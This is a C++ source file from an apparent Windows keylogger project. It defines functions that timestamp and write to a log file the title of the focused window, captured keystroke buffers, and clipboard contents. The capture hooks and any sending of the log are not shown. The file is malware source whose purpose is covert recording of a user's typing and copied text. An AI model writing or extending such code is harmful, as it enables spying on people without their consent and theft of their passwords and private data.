#include "Keylogger.h"

std::string getTime(const char * format)
{
    std::tm bt{};
    std::time_t timer = std::time(0);
    char buffer[64];

    memset(buffer, 0, sizeof(buffer));

    localtime_s(&bt, &timer);
    std::strftime(buffer, 64, format, &bt);
    return (std::string(buffer));
}

void logWindowChange()
{
    std::ofstream myfile;
    myfile.open(winkey_g.pathFile, std::ios::in | std::ios::out | std::ios::ate);
    if (!winkey_g.nl)
        myfile << std::endl;
    myfile << getTime("[%d.%m.%Y %H:%M:%S]") << " - '" << winkey_g.hwndFocusedWindow << "'" << std::endl;
    memcpy(winkey_g.hwndPrevFocusedWindow, winkey_g.hwndFocusedWindow, 256);
    myfile.close();
}

void logInput(char* buffer)
{
    std::ofstream myfile;

    myfile.open(winkey_g.pathFile, std::ios::in | std::ios::out | std::ios::ate);
    if (!myfile.is_open())
        std::cout << "failed to open file\n";
    myfile << buffer;
    myfile.close();
}

void logClipboard(std::string buffer)
{
    std::ofstream myfile;
    myfile.open(winkey_g.pathFile, std::ios::in | std::ios::out | std::ios::ate);
    if (!winkey_g.nl)
        myfile << std::endl;
    myfile << getTime("[%d.%m.%Y %H:%M:%S]") << " - ClipBoard : '" << buffer << "'" << std::endl;
    myfile.close();
}